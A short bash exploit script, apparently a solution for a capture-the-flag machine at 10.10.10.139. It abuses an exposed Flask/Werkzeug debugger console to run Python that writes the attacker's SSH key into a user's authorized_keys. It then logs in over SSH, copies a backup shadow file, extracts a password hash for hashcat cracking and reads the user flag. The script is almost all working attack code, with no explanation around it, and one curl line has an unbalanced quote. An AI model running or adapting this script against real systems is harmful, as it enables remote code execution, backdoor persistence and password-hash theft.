#!/bin/bash

target="10.10.10.139"
url="http://$target/articles/11"
public_key=""
private_key=""
wordlist=""

# Get Debugger instance
response=$(curl -s " $url)
frame=$(echo $response | sed -n "s/^.*id=\"frame-\(\S*\)\">.*$/\1/p")
secret=$(echo $response | sed -n "s/^.*SECRET\s*=\s*\"\(\S*\)\".*$/\1/p") 

# Append ssh key
cmd="f=open('/home/hal/.ssh/authorized_keys','w');f.write('$(cat $public_key)')"

curl -s -G "$url" --data-urlencode "__debugger__=yes" \
	   --data-urlencode "cmd=$cmd" \
	   --data-urlencode "frm=$frame" \
	   --data-urlencode "s=$secret"  \
	   --header "X-Requested-With: XMLHttpRequest"	

# Retreive hashes
ssh -i $private_key hal@"${target}" 'find / -group adm 2>/dev/null' > ./adm-group.txt 
ssh -i $private_key hal@"${target}" 'cat /var/backups/shadow.bak' > ./shadow.bak
grep margo shadow.bak > margo.hash

#hashcat -m 1800 margo.hash $wordlist

# Get user flag
ssh margo@"${target}" 'cat /home/margo/user.txt'



